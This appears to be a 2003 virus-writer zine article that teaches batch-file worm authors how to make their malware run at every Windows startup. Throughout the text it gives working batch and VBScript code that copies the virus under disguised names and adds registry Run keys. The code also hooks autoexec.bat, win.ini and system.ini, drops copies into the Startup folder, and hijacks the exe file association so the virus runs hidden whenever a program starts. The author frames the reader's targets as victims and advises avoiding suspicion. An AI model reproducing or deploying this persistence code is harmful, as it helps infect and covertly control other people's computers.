
 
                               +-=-=-=-=-=-=-=-=-+
 .:Startup Methods for Batch:. |  BATch Zone #2  |
   `````````````````````````   +-=-=-=-=-=-=-=-=-+


			_____________________________________________
			¦¦»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»¦¦
			¦¦  Startup Methods for Batch - By SAD1c   ¦¦
			¦¦«««««««««««««««««««««««««««««««««««««««««¦¦
			¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯

	INDEX:
		(1) - Little Intro
		(2) - Registry startup
		(3) - Autoexec.bat & Winstart.bat startup
		(4) - Win.ini & System.ini startup
		(5) - Startup folder
		(6) - Shell Spawning
		(7) - Conclusion

1) Little Intro:

	For a good worm, restarting on every windows startup it's a necessity.
	Of course, also for batch worms! Here you can find a lot of ways!
	Now you know what this article is about, so let's code.

2) Registry startup:
	
	This is the most common way to place a worm/virus on startup. There are
	a lot of variants, but first, we'll se how to copy the worm/virus into
	another path and write a reg file, that will add a string to the registry,
	so our worm/virus will run on every startup. Now the example:

	copy %0 %windir%\SysLog32.bat
	:: the above copy the virus into another path
	echo REGEDIT4>startup.reg
	echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>startup.reg
	echo "System Logging"="%%windir%%\\SysLog32.bat">>startup.reg
	:: write the reg file
	regedit /s startup.reg
	:: add the key using the "regedit.exe" file

	As I said before there are many variants. Here are some:

	- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

	- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run-

	- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

	- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices

	- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices-

	- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce

	- HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

	- HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

	The "RunOnce" and "RunServicesOnce" deletes the registry key after running the file,
	but this isn't a problem, because the virus/worm will be executed, so it will add
	the key again.

3) Autoexec.bat & Winstart.bat startup:
	
	These two are very simple, but didn't works on NT systems.
	There are two ways to use these two files as a startup: you can add a hooking
	command, that will run your batch, or you can infect it. Let's see the first:

	copy %0 C:\WinServ.bat
	:: the above copy the virus into the root
	type C:\autoexec.bat|find "WinServ.bat">C:\autoexec.bat
	:: this rewrite the autoexec.bat, so if it's already hooked, we'll clear the line
	echo @call C:\WinServ.bat>>C:\autoexec.bat
	:: the above add the hooking line to the autoexec.bat

	The same for the "Winstart.bat", just place "%windir%\Winstart.bat" instead of
	"autoexec.bat" and the game is done.

4) Win.ini & System.ini startup:

	A little bit difficult than Autoexec.bat & Winstart.bat. we have to copy
	the .ini file into a temporary file without some strings, than we can replace
	the original file with the hooking part and the modified .ini into the ending
	part. Stop talking! The code:

	copy %0 %windir%\WinDebug.bat
	:: the above copy the virus into windows dir.
	find /v /i "[boot]"<%WiNDir%\system.ini>temp1.tmp
	find /v /i "shell=explorer.exe"<temp1.tmp>temp2.tmp
	:: the above write a modified copy of the system.ini
	echo [boot]>%wIndIR%\system.ini
	echo Shell=Explorer.exe WinDebug.bat>>%wiNdIR%\system.ini
	:: the above overwrite the system.ini with the hooking part
	type temp2.tmp>>%WIndIR%\system.ini
	:: the above add the modified copy to the system.ini
	del temp?.tmp
	:: the above deletes the temporary files

	copy %0 %windir%\TaskLoad.bat
	:: the above copy the virus into windows dir.
	find /v /i "[windows]"<%windir%\win.ini>temp1.tmp
	find /v /i "load="<temp1.tmp>temp2.tmp
	find /v /i "run="<temp2.tmp>temp1.tmp
	find /v /i "NullPort="<temp1.tmp>temp2.tmp
	:: the above write a modified copy of the win.ini
	echo [windows]>%wiNdIR%\win.ini
	echo load=TaskLoad.bat>>%winDIr%\win.ini
	echo run=>>%wINDir%\win.ini
	echo NullPort=None>>%windIr%\win.ini
	:: the above overwrite the win.ini with the hooking part
	type temp2.tmp>>%wiNDir%\win.ini
	:: the above add the modified copy to the win.ini
	del temp?.tmp
	:: the above deletes the temporary files

	Note: into Win.ini you can use both "load" and/or "run" without problems.

5) Startup folder:

	The startup folder is a predefined folder. Every file into this folder
	will be executed on windows startup. The folder path is written into
	the registry, so we need a VBScript to get the folder path.

	copy %0 C:\temp.tmp
	:: copy the virus to a temporary file
	echo.on error resume next>temp.vbs
	:: prevent error messages
	echo dir=createobject("wscript.shell").specialfolders("startup")>>temp.vbs
	:: get the startup directory
	echo createobject("scripting.filesystemobject").copyfile "C:\temp.tmp",dir&"\CheckData.bat">>temp.vbs
	:: copy the virus/worm into the startup directory
	cscript temp.vbs
	:: executes the script
	del C:\temp.tmp
	del temp.vbs
	:: deletes the temporary files

6) Shell Spawning:

	Here comes the hard part. Shell spawning is a very powerful method to keep
	running your virus/worm. It consist in replacing one or more reg. strings
	with another string, so the virus/worm will be executed instead of the
	file wanted. You can do this for these files: exe, scr, com, pif, cmd...
	(you can use also other extensions, but these are more effectives.)
	The problem of this technique is this: if you don't implement this with your
	virus/worm, the system will execute only the virus, so the victim will be
	unable to execute the kind of files that he/she wants. To prevent this,
	you have to write a (not so simple) VBScript that will be run instead of
	the batch worm/virus. Here an example, wich uses shell spawning for "exe"
	files. If you want to add/use other extensions, just replace the wanted
	extension into the key strings. I Hope that you'll understand!

	copy %0 %windir%\SysScan.bat
	:: copy the virus into the windows dir

	:: The next part create a vbs file to write the reg. key for shell spawning
	echo.on error resume next>temp.vbs
	:: prevent error messages
	echo set sh=createobject("wscript.shell")>>temp.vbs
	:: necessary to write the key into the registry
	echo sh.regwrite "HKCR\exefile\Shell\Open\Command\","wscript.exe C:\CmdLoad.vbs ""%%1 %%*""">>temp.vbs
	:: write the key. It will execute the VBScript EVERYTIME an "exe" will be run
	cscript temp.vbs
	:: executes the script
	del temp.vbs
	:: deletes the temporary file
	
	:: The next part creates the VBScript that will be executed everytime.
	echo.on error resume next>C:\CmdLoad.vbs
	:: prevent error messages
	echo dim arg,tmp2>>C:\CmdLoad.vbs
	:: declare some variables
	echo set sh=createobject("wscript.shell")>>C:\CmdLoad.vbs
	:: necessary to execute files
	echo set arg=wscript.arguments>>C:\CmdLoad.vbs
	:: gets the arguments of the script
	echo if not(arg.count)=1 then>>C:\CmdLoad.vbs
	:: if the arguments number isn't one, it means that we have something to run
	echo for tmp1=0 to arg.count-1>>C:\CmdLoad.vbs
	:: a loop that will place all the arguments into a string
	echo tmp2=arg(tmp1)&" ">>C:\CmdLoad.vbs
	:: add the argument and a space to the string
	echo next>>C:\CmdLoad.vbs
	:: continue looping
	echo sh.exec tmp2>>C:\CmdLoad.vbs
	:: very important. executes the file with his arguments (if there are any)
	echo end if>>C:\CmdLoad.vbs
	:: end of the previous "if" block
	echo sh.run "%windir%\SysScan.bat",0>>C:\CmdLoad.vbs
	:: also this is very important: it executes the virus/worm in hide way

	Important Note: obviously the victim will run a lot of exe or similar files,
	so your virus will keep running practically continuously. To prevent this
	you should add a control, for example adding a parameter to the batch
	execution into the VBScript, so your batch will check if the parameter is
	present, and, if it is , the batch will perform only faster operations,
	like copying or writing to registry, not stuffs like mass worming or
	infections, that will make the system too slow and cause suspicion.
	I developed this technique in my BoM, and I called it "execution control".

7) Conclusion:
	
	That's all, coder. If you are interested on something more difficult,
	download the last version of my BoM from: http://sad1cpage.supereva.it
 	If you want to tell/ask me something, mail me at: sad1c@interfree.it
	I Hope that you enjoyed with this article. Good coding!

	Written By SAD1c, 22/06/2003


 
                               +-=-=-=-=-=-=-=-=-+
 .:Startup Methods for Batch:. |  BATch Zone #2  |
   `````````````````````````   +-=-=-=-=-=-=-=-=-+

  02.07.2003, Romania
